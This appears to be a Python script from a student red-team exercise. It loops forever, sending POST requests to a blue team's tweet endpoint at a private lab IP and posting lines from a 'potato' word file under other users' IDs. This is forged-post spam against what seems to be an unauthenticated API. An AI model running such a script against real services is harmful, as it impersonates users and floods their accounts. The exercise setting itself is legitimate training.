# Alex Rosse
# CDT Red Team
# Python Script to send post requests to add potato tweets
# to blue team 1's web servers

import json
import requests
import time
import base64
import os

blue1url = 'http://10.0.1.4:5000/tweet/add-tweet'

# Our Users
redTeamUsers = ['dlennon','mjvl','wDestler','hTubman123','JaneDoe','jbarrett01','johncena','lskywalker']

# Get Team 1 Users
blue1json = open('blue1.json',)
data1 = json.load(blue1json)
blue1json.close()
blue1 = []

for u in data1['following']:
    if (u['username']) not in redTeamUsers:
        blue1.append(u['id'])

# Words
words = open('potato.txt')
content = words.readlines()

counter = 0
# Go until the user interrupts
#
# Loop through all blue1 users sending a tweet of
# the next potato in the folder 
#
# Will wait X seconds after each request to not DoS the website,
# just be to annoying
while(1):
    for u in blue1:
        req = {"userId" : (f"{u}"), "text" : content[counter % len(content)]}
        res = requests.post(blue1url, json = req)
        print(counter , res)
        counter += 1
        time.sleep(10)
